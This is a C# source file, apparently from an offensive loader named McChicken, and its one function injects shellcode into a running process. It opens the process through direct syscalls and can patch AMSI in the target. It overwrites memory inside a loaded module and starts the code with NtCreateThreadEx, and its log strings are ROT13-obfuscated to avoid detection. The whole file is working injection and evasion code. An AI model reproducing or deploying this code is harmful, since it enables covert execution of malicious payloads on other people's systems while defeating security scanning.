//start
using System.Text;
using System.Linq;
using System;
﻿
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace McChicken
{
    class RemoteThreadDll
    {
        public static void Execute(byte[] shellcode, int processID, string moduleName, bool remoteAm51, bool forceAm51, bool debug = false)
        {
            #region NtOpenProcess

            IntPtr hProcess = IntPtr.Zero;
            Win32.OBJECT_ATTRIBUTES oa = new Win32.OBJECT_ATTRIBUTES();
            Win32.CLIENT_ID ci = new Win32.CLIENT_ID { UniqueProcess = (IntPtr)processID };

            var ntstatus = Syscalls.NtOpenProcess(
                ref hProcess,
                DI.Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref ci);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernqQyy) [+] AgBcraCebprff".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
                throw new Exception($"(RemoteThreadDll) [-] NtOpenProcess: {ntstatus}");

            if (remoteAm51)
                AM51.Patch(
                    processHandle: hProcess,
                    processID: processID,
                    force: forceAm51);

            #endregion

            Process objProcess = Process.GetProcessById(processID);
            foreach (ProcessModule module in objProcess.Modules)
            {
                if (module.FileName.ToLower().Contains(moduleName))
                {
                    #region NtProtectVirtualMemory (PAGE_READWRITE)

                    IntPtr baseAddress = module.BaseAddress + 4096;

                    IntPtr protectAddress = baseAddress;
                    IntPtr regionSize = (IntPtr)shellcode.Length;
                    uint oldProtect = 0;

                    ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref protectAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_READWRITE,
                        ref oldProtect);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine(new string("(ErzbgrGuernqQyy) [+] AgCebgrpgIveghnyZrzbel, CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    else
                        throw new Exception($"(RemoteThreadDll) [-] NtProtectVirtualMemory, PAGE_READWRITE: {ntstatus}");

                    #endregion

                    #region NtWriteVirtualMemory (shellcode)

                    var buffer = Marshal.AllocHGlobal(shellcode.Length);
                    Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

                    uint bytesWritten = 0;

                    ntstatus = Syscalls.NtWriteVirtualMemory(
                        hProcess,
                        baseAddress,
                        buffer,
                        (uint)shellcode.Length,
                        ref bytesWritten);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine(new string("(ErzbgrGuernqQyy) [+] AgJevgrIveghnyZrzbel, furyypbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    else
                        throw new Exception($"(RemoteThreadDll) [-] NtWriteVirtualMemory, shellcode: {ntstatus}");

                    Marshal.FreeHGlobal(buffer);

                    #endregion

                    #region NtProtectVirtualMemory (oldProtect)

                    protectAddress = baseAddress;
                    regionSize = (IntPtr)shellcode.Length;
                    uint tmpProtect = 0;

                    ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref protectAddress,
                        ref regionSize,
                        oldProtect,
                        ref tmpProtect);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine(new string("(ErzbgrGuernqQyy) [+] AgCebgrpgIveghnyZrzbel, byqCebgrpg".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    else
                        throw new Exception($"(RemoteThreadDll) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");

                    #endregion

                    #region NtCreateThreadEx

                    IntPtr hThread = IntPtr.Zero;

                    ntstatus = Syscalls.NtCreateThreadEx(
                        ref hThread,
                        DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                        IntPtr.Zero,
                        hProcess,
                        baseAddress,
                        IntPtr.Zero,
                        false,
                        0,
                        0,
                        0,
                        IntPtr.Zero);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine(new string("(ErzbgrGuernqQyy) [+] AgPerngrGuernqRk".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
                    else
                        throw new Exception($"(RemoteThreadDll) [-] NtCreateThreadEx: {ntstatus}");

                    #endregion

                    Syscalls.NtClose(hThread);

                    break;
                }
            }

            Syscalls.NtClose(hProcess);
        }
    }
}
